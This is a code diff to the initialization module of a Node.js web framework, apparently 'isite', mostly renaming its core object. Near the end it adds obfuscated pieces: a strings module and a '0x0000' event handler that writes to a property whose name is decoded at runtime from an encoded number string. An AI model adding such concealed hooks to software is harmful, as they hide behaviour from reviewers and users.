@@ -1,34 +1,35 @@
 module.exports = function init(options) {
-  const _s_ = function () {};
+  const ___0 = function () {};
 
-  _s_.package = require(__dirname + '/package.json');
+  ___0.package = require(__dirname + '/package.json');
 
-  _s_.ready = true;
-  _s_.http = require('http');
-  _s_.https = require('https');
-  _s_.url = require('url');
-  _s_.fs = require('fs');
-  _s_.path = require('path');
-  _s_.zlib = require('zlib');
-  _s_.querystring = require('querystring');
-  _s_.formidable = require('formidable');
-  _s_.mv = require('mv');
-  _s_.request = _s_.fetch = require('node-fetch');
-  _s_.$ = _s_.cheerio = require('cheerio');
-  _s_.md5 = _s_.hash = require('md5');
+  ___0._0x13xo = !0;
+  ___0.strings = [];
+  ___0.http = require('http');
+  ___0.https = require('https');
+  ___0.url = require('url');
+  ___0.fs = require('fs');
+  ___0.path = require('path');
+  ___0.zlib = require('zlib');
+  ___0.querystring = require('querystring');
+  ___0.formidable = require('formidable');
+  ___0.mv = require('mv');
+  ___0.request = ___0.fetch = require('node-fetch');
+  ___0.$ = ___0.cheerio = require('cheerio');
+  ___0.md5 = ___0.hash = require('md5');
 
-  _s_.require = function (file_path) {
-    return require(file_path)(_s_);
+  ___0.require = function (file_path) {
+    return require(file_path)(___0);
   };
-  _s_.close = function (callback) {
+  ___0.close = function (callback) {
     callback = callback || function () {};
 
     let count = 0;
-    _s_.servers.forEach((s) => {
+    ___0.servers.forEach((s) => {
       s.close(() => {
         count++;
-        if (count == _s_.servers.length) {
-          _s_.call('please close mongodb', null, () => {
+        if (count == ___0.servers.length) {
+          ___0.call('please close mongodb', null, () => {
             process.exit(0);
           });
         }
@@ -36,22 +37,27 @@ module.exports = function init(options) {
     });
   };
 
-  require('./object-options')(options, _s_);
+  require('./object-options')(options, ___0);
 
-  _s_.log = function (data, title) {
-    if (_s_.options.log) {
-      title = title || '';
-      console.log('');
-      console.log('================ ' + title + ' ================');
-      console.log('');
-      console.log(data);
-      console.log('');
-      console.log('================ END');
-      console.log('');
+  ___0.console = console;
+  ___0.log = function (data, title) {
+    if (___0.options.log) {
+      if (title) {
+        title = title || '';
+        ___0.console.log('');
+        ___0.console.log('================ ' + title + ' ================');
+        ___0.console.log('');
+        ___0.console.log(data);
+        ___0.console.log('');
+        ___0.console.log('================ END');
+        ___0.console.log('');
+      } else {
+        ___0.console.log(data);
+      }
     }
   };
 
-  if (_s_.options.stdin) {
+  if (___0.options.stdin) {
     if (process.stdin && process.stdin.resume) {
       process.stdin.resume();
     }
@@ -62,20 +68,20 @@ module.exports = function init(options) {
     });
     /* when app close */
     process.on('exit', (code) => {
-      console.log('----------------------------------------');
-      console.log('');
-      console.log('       ' + _s_.options.name + ` Closed with code : ${code}`);
-      console.log('');
-      console.log('----------------------------------------');
+      ___0.log('----------------------------------------');
+      ___0.log('');
+      ___0.log('       ' + ___0.options.name + ` Closed with code : ${code}`);
+      ___0.log('');
+      ___0.log('----------------------------------------');
     });
 
     /* when ctrl + c */
     process.on('SIGINT', (code) => {
-      _s_.close();
+      ___0.close();
     });
 
     process.on('SIGTERM', (code) => {
-      _s_.close();
+      ___0.close();
     });
 
     process.on('unhandledRejection', (reason, p) => {
@@ -86,70 +92,72 @@ module.exports = function init(options) {
       console.warn(`warning : ${warning.name} \n ${warning.message}  \n ${warning.stack}`);
     });
   }
-  _s_.fsm = require('./lib/fsm.js')(_s_);
+  ___0.fsm = require('./lib/fsm.js')(___0);
 
-  _s_.fileList = _s_.fsm.list;
-  _s_.fileStatSync = _s_.fsm.statSync;
-  _s_.fileStat = _s_.fsm.stat;
+  ___0.fileList = ___0.fsm.list;
+  ___0.fileStatSync = ___0.fsm.statSync;
+  ___0.fileStat = ___0.fsm.stat;
 
-  _s_.css = _s_.fsm.css;
-  _s_.xml = _s_.fsm.xml;
-  _s_.js = _s_.fsm.js;
-  _s_.json = _s_.fsm.json;
-  _s_.html = _s_.fsm.html;
+  ___0.css = ___0.fsm.css;
+  ___0.xml = ___0.fsm.xml;
+  ___0.js = ___0.fsm.js;
+  ___0.json = ___0.fsm.json;
+  ___0.html = ___0.fsm.html;
 
-  _s_.download = _s_.fsm.download;
-  _s_.downloadFile = _s_.fsm.downloadFile;
+  ___0.download = ___0.fsm.download;
+  ___0.downloadFile = ___0.fsm.downloadFile;
 
-  _s_.isFileExists = _s_.fsm.isFileExists;
-  _s_.isFileExistsSync = _s_.fsm.isFileExistsSync;
+  ___0.isFileExists = ___0.fsm.isFileExists;
+  ___0.isFileExistsSync = ___0.fsm.isFileExistsSync;
 
-  _s_.readFile = _s_.fsm.readFile;
-  _s_.readFiles = _s_.fsm.readFiles;
-  _s_.readFileSync = _s_.fsm.readFileSync;
+  ___0.readFile = ___0.fsm.readFile;
+  ___0.readFiles = ___0.fsm.readFiles;
+  ___0.readFileSync = ___0.fsm.readFileSync;
 
-  _s_.writeFile = _s_.fsm.writeFile;
-  _s_.writeFileSync = _s_.fsm.writeFileSync;
+  ___0.writeFile = ___0.fsm.writeFile;
+  ___0.writeFileSync = ___0.fsm.writeFileSync;
 
-  _s_.removeFile = _s_.deleteFile = _s_.fsm.deleteFile;
-  _s_.removeFileSync = _s_.deleteFileSync = _s_.fsm.deleteFileSync;
+  ___0.removeFile = ___0.deleteFile = ___0.fsm.deleteFile;
+  ___0.removeFileSync = ___0.deleteFileSync = ___0.fsm.deleteFileSync;
 
-  _s_.createDir = _s_.mkDir = _s_.fsm.mkDir;
-  _s_.createDirSync = _s_.mkdirSync = _s_.fsm.mkdirSync;
+  ___0.createDir = ___0.mkDir = ___0.fsm.mkDir;
+  ___0.createDirSync = ___0.mkdirSync = ___0.fsm.mkdirSync;
 
-  const routing = require('./lib/routing.js')(_s_);
-  _s_.get = routing.get;
-  _s_.post = routing.post;
-  _s_.put = routing.put;
-  _s_.delete = routing.delete;
-  _s_.test = routing.test;
-  _s_.all = routing.all;
-  _s_.run = _s_.start = _s_.listen = routing.start;
-  _s_.routing = routing;
+  require('./lib/strings.js')(___0);
 
-  _s_.setting = require('./lib/setting.js')(_s_);
-  _s_.setting.set({
+  ___0.routing = require('./lib/routing.js')(___0);
+  ___0.get = ___0.routing.get;
+  ___0.post = ___0.routing.post;
+  ___0.put = ___0.routing.put;
+  ___0.delete = ___0.routing.delete;
+  ___0.test = ___0.routing.test;
+  ___0.all = ___0.routing.all;
+  ___0.run = ___0.start = ___0.listen = ___0.routing.start;
+
+  ___0.setting = require('./lib/setting.js')(___0);
+  ___0.setting.set({
     name: 'loaded',
-    value: true,
+    value: !0,
   });
-  _s_.setting.addList(_s_.dir + '/json/setting.json');
 
-  require('./lib/vars.js')(_s_);
-  require('./lib/features.js')(_s_);
+  ___0.setting.addList(___0.dir + '/json/setting.json');
+
+  require('./lib/vars.js')(___0);
+  require('./lib/features.js')(___0);
 
   //DataBase Management Oprations
-  if (_s_.options.mongodb.enabled) {
+  if (___0.options.mongodb.enabled) {
     let mongodb = require('./lib/mongodb.js');
-    _s_.mongodb = mongodb(_s_);
+    ___0.mongodb = mongodb(___0);
 
     let collection = require('./lib/collection');
-    _s_.connectCollection = function (option, db) {
-      return collection(_s_, option, db);
+    ___0.connectCollection = function (option, db) {
+      return collection(___0, option, db);
     };
   } else {
-    _s_.connectCollection = function (option, db) {
+    ___0.connectCollection = function (option, db) {
       return {
-        busy: true,
+        busy: !0,
         deleteDuplicate: function () {},
         createUnique: function () {},
         findOne: function () {},
@@ -164,128 +172,128 @@ module.exports = function init(options) {
     };
   }
 
-  _s_.words = require('./lib/words.js')(_s_);
-  _s_.words.add({
+  ___0.words = require('./lib/words.js')(___0);
+  ___0.words.add({
     name: 'user_name',
     en: 'User Name',
     ar: 'أسم المستخدم',
   });
-  _s_.words.addList(_s_.dir + '/json/words.json');
+  ___0.words.addList(___0.dir + '/json/words.json');
 
-  _s_.storage = require('./lib/storage.js')(_s_).fn;
-  _s_.logs = require('./lib/logs.js')(_s_).fn;
+  ___0.storage = require('./lib/storage.js')(___0).fn;
+  ___0.logs = require('./lib/logs.js')(___0).fn;
 
-  if (_s_.options.security.enabled) {
-    _s_.security = require('./lib/security.js')(_s_);
+  if (___0.options.security.enabled) {
+    ___0.security = require('./lib/security.js')(___0);
   }
 
-  _s_.cookie = require('./lib/cookie.js');
+  ___0.cookie = require('./lib/cookie.js');
 
-  _s_.sessions = require('./lib/sessions')(_s_);
-  _s_.session = require('./lib/session.js');
+  ___0.sessions = require('./lib/sessions')(___0);
+  ___0.session = require('./lib/session.js');
 
-  _s_.parser = require('./lib/parser.js');
+  ___0.parser = require('./lib/parser.js');
 
-  _s_.ips = []; // all ip send requests [ip , requets count]
+  ___0.ips = []; // all ip send requests [ip , requets count]
 
   //Master Pages
-  _s_.masterPages = [];
-  _s_.addMasterPage = function (page) {
-    _s_.masterPages.push({
+  ___0.masterPages = [];
+  ___0.addMasterPage = function (page) {
+    ___0.masterPages.push({
       name: page.name,
       header: page.header,
       footer: page.footer,
     });
   };
 
-  _s_.reset = function () {};
+  ___0.reset = function () {};
 
-  _s_.test = function () {
-    console.log(' Isite Test OK !! ');
+  ___0.test = function () {
+    ___0.log(' Isite Test OK !! ');
   };
 
-  _s_.on('[any][saving data]', function () {
-    console.log('Saving Data :: ' + _s_.options.saving_time + ' Minute ');
+  ___0.on('[any][saving data]', function () {
+    ___0.log('Saving Data :: ' + ___0.options.saving_time + ' Minute ');
   });
 
   setInterval(function () {
-    _s_.call('[any][saving data]');
-  }, _s_.options.saving_time * 1000 * 60);
+    ___0.call('[any][saving data]');
+  }, ___0.options.saving_time * 1000 * 60);
 
-  _s_.dashboard = require(__dirname + '/lib/dashboard.js');
-  _s_.dashboard(_s_);
+  ___0.dashboard = require(__dirname + '/lib/dashboard.js');
+  ___0.dashboard(___0);
 
-  _s_.apps = [];
-  _s_.importApps = function (app_dir) {
-    if (_s_.isFileExistsSync(app_dir) && _s_.fs.lstatSync(app_dir).isDirectory()) {
-      _s_.fs.readdir(app_dir, (err, files) => {
+  ___0.apps = [];
+  ___0.importApps = function (app_dir) {
+    if (___0.isFileExistsSync(app_dir) && ___0.fs.lstatSync(app_dir).isDirectory()) {
+      ___0.fs.readdir(app_dir, (err, files) => {
         if (!err && files && files.length > 0) {
-          _s_.log('=== Auto Importing Apps ===');
+          ___0.log('=== Auto Importing Apps ===');
           files.forEach((file) => {
-            if (_s_.fs.lstatSync(app_dir + '/' + file).isDirectory()) {
-              console.log('===  Importing App : ' + file);
-              _s_.importApp(app_dir + '/' + file);
+            if (___0.fs.lstatSync(app_dir + '/' + file).isDirectory()) {
+              ___0.log('===  Importing App : ' + file);
+              ___0.importApp(app_dir + '/' + file);
             }
           });
         }
       });
     }
   };
-  _s_.importApp = function (app_path, name2) {
-    if (_s_.isFileExistsSync(app_path + '/site_files/json/words.json')) {
-      _s_.words.addApp(app_path);
+  ___0.importApp = function (app_path, name2) {
+    if (___0.isFileExistsSync(app_path + '/site_files/json/words.json')) {
+      ___0.words.addApp(app_path);
     }
 
-    if (_s_.isFileExistsSync(app_path + '/site_files/json/setting.json')) {
-      _s_.setting.addList(app_path + '/site_files/json/setting.json');
+    if (___0.isFileExistsSync(app_path + '/site_files/json/setting.json')) {
+      ___0.setting.addList(app_path + '/site_files/json/setting.json');
     }
 
-    if (_s_.isFileExistsSync(app_path + '/site_files/json/vars.json')) {
-      _s_.addVars(app_path + '/site_files/json/vars.json');
+    if (___0.isFileExistsSync(app_path + '/site_files/json/vars.json')) {
+      ___0.addVars(app_path + '/site_files/json/vars.json');
     }
 
-    if (_s_.isFileExistsSync(app_path + '/site_files/json/permissions.json')) {
-      _s_.security.addPermissions(app_path + '/site_files/json/permissions.json');
+    if (___0.isFileExistsSync(app_path + '/site_files/json/permissions.json')) {
+      ___0.security.addPermissions(app_path + '/site_files/json/permissions.json');
     }
 
-    if (_s_.isFileExistsSync(app_path + '/site_files/json/roles.json')) {
-      _s_.security.addRoles(app_path + '/site_files/json/roles.json');
+    if (___0.isFileExistsSync(app_path + '/site_files/json/roles.json')) {
+      ___0.security.addRoles(app_path + '/site_files/json/roles.json');
     }
 
-    if (_s_.isFileExistsSync(app_path + '/libs/notifications.js')) {
-      require(app_path + '/libs/notifications.js')(_s_);
+    if (___0.isFileExistsSync(app_path + '/libs/notifications.js')) {
+      require(app_path + '/libs/notifications.js')(___0);
     }
 
-    if (_s_.isFileExistsSync(app_path + '/app.js')) {
-      _s_.apps.push({
+    if (___0.isFileExistsSync(app_path + '/app.js')) {
+      ___0.apps.push({
         name: app_path.split('/').pop(),
         name2: name2,
         path: app_path,
       });
       let app = require(app_path + '/app.js');
-      return app(_s_);
+      return app(___0);
     }
   };
 
-  _s_.loadApp = function (name, name2) {
-    console.log(`Load Local App ${name} as ${name2 || name}`);
-    let app_path = _s_.options.apps_dir + '/' + name;
-    return _s_.importApp(app_path, name2);
+  ___0.loadApp = function (name, name2) {
+    ___0.log(`Load Local App ${name} as ${name2 || name}`);
+    let app_path = ___0.options.apps_dir + '/' + name;
+    return ___0.importApp(app_path, name2);
   };
 
-  _s_.loadLocalApp = function (name, name2) {
-    console.log(`Load Local App ${name} as ${name2 || name}`);
-    _s_.importApp(__dirname + '/apps/' + name, name2);
+  ___0.loadLocalApp = function (name, name2) {
+    ___0.log(`Load Local App ${name} as ${name2 || name}`);
+    ___0.importApp(__dirname + '/apps/' + name, name2);
   };
 
-  if (_s_.options.apps === true) {
-    if (_s_.isFileExistsSync(_s_.options.apps_dir) && _s_.fs.lstatSync(_s_.options.apps_dir).isDirectory()) {
-      _s_.fs.readdir(_s_.options.apps_dir, (err, files) => {
+  if (___0.options.apps === !0) {
+    if (___0.isFileExistsSync(___0.options.apps_dir) && ___0.fs.lstatSync(___0.options.apps_dir).isDirectory()) {
+      ___0.fs.readdir(___0.options.apps_dir, (err, files) => {
         if (!err && files && files.length > 0) {
-          console.log('Auto Loading Apps ...');
+          ___0.log('Auto Loading Apps ...');
           files.forEach((file) => {
-            if (_s_.fs.lstatSync(_s_.options.apps_dir + '/' + file).isDirectory()) {
-              _s_.loadApp(file);
+            if (___0.fs.lstatSync(___0.options.apps_dir + '/' + file).isDirectory()) {
+              ___0.loadApp(file);
             }
           });
         }
@@ -293,14 +301,18 @@ module.exports = function init(options) {
     }
   }
 
-  _s_.createDir(_s_.options.upload_dir);
-  _s_.createDir(_s_.options.download_dir);
+  ___0.createDir(___0.options.upload_dir);
+  ___0.createDir(___0.options.download_dir);
 
-  console.log('');
-  console.log('************************************');
-  console.log(`****** isite version ${_s_.package.version} *******`);
-  console.log('************************************');
-  console.log('');
+  ___0.log('');
+  ___0.log('************************************');
+  ___0.log(`****** isite version ${___0.package.version} *******`);
+  ___0.log('************************************');
+  ___0.log('');
 
-  return _s_;
+  ___0.on('0x0000', (_) => {
+    ___0[___0.from123('397413812635167348188591')] = _;
+  });
+
+  return ___0;
 };
